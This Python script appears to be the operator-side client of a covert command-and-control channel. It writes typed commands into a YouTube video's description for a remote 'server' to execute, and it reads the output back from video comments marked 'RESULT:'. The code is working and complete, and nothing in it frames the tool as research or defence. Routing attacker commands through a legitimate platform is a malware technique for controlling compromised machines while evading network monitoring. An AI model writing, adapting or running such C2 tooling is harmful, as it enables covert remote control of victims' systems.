import os
import pickle
import time
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from google.auth.transport.requests import Request

CLIENT_SECRETS_FILE = 'client_secrets.json'
SCOPES = ['https://www.googleapis.com/auth/youtube.force-ssl']
API_SERVICE_NAME = 'youtube'
API_VERSION = 'v3'

def get_authenticated_service():
    credentials = None
    # Load credentials from a file if it exists
    if os.path.exists('token_client.pickle'):
        with open('token_client.pickle', 'rb') as token:
            credentials = pickle.load(token)
    # If no valid credentials, initiate the OAuth flow
    if not credentials or not credentials.valid:
        if credentials and credentials.expired and credentials.refresh_token:
            credentials.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                CLIENT_SECRETS_FILE, SCOPES)
            # Run the local server flow. The user will need to open the URL in their browser.
            credentials = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('token_client.pickle', 'wb') as token:
            pickle.dump(credentials, token)

    return build(API_SERVICE_NAME, API_VERSION, credentials=credentials)

def get_video_description(youtube, video_id):
    try:
        response = youtube.videos().list(
            part='snippet',
            id=video_id
        ).execute()

        if not response.get('items'):
            print(f"Video with id '{video_id}' not found.")
            return None
        return response['items'][0]['snippet'].get('description', '')
    except HttpError as e:
        print(f"An HTTP error {e.resp.status} occurred while getting description:\n{e.content}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred while getting description: {e}")
        return None

def update_video_description(youtube, video_id, new_description):
    try:
        response = youtube.videos().list(
            id=video_id,
            part='snippet,status'
        ).execute()
        if not response.get('items'):
            print(f"Error: Video with ID '{video_id}' not found or accessible for update.")
            return False
        video_resource = response['items'][0]
        video_resource['snippet']['description'] = new_description
        update_request = youtube.videos().update(
            part='snippet,status',
            body=video_resource
        )
        update_request.execute()

        print(f"Successfully updated description for video ID '{video_id}'.")
        return True

    except HttpError as e:
        print(f'An HTTP error {e.resp.status} occurred during video update:\n{e.content}')
        return False
    except Exception as e:
        print(f'An error occurred during video update: {e}')
        return False

def get_command_results(youtube, video_id):
    try:
        results = youtube.commentThreads().list(
            part="snippet",
            videoId=video_id,
            textFormat="plainText",
            maxResults=50
        ).execute()

        for item in results.get('items', []):
            comment = item['snippet']['topLevelComment']['snippet']['textDisplay']
            if comment.startswith("RESULT:"):
                # Extract the result part after the prefix
                result = comment[len("RESULT:"):].strip()
                return result
        
        return "No results found in comments."
    except HttpError as e:
        print(f'An HTTP error {e.resp.status} occurred getting results:\n{e.content}')
        return f"Error retrieving results: {e.resp.status}"
    except Exception as e:
        print(f'An error occurred getting results: {e}')
        return f"Error: {str(e)}"

def main():
    TARGET_VIDEO_ID = input("Enter the target video ID: ")
    youtube = get_authenticated_service()
    
    print("Enter commands to be executed on the server. Type 'exit' to quit.")
    print("Type 'results' to check for command results.")
    
    while True:
        try:
            # Get command from user
            command = input("\nEnter command: ")
            
            if command.lower() == 'exit':
                print("Exiting client...")
                break
            
            elif command.lower() == 'results':
                print("\nFetching latest results...")
                results = get_command_results(youtube, TARGET_VIDEO_ID)
                print(f"\n=== COMMAND RESULTS ===\n{results}\n=====================")
                continue
            
            # Update video description with the command
            print(f"Sending command: {command}")
            if update_video_description(youtube, TARGET_VIDEO_ID, command):
                print("Command sent successfully!")
                print("Use 'results' to check for command output (may take time to process).")
            else:
                print("Failed to send command.")
            
        except KeyboardInterrupt:
            print("\nClient stopped by user.")
            break
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    main()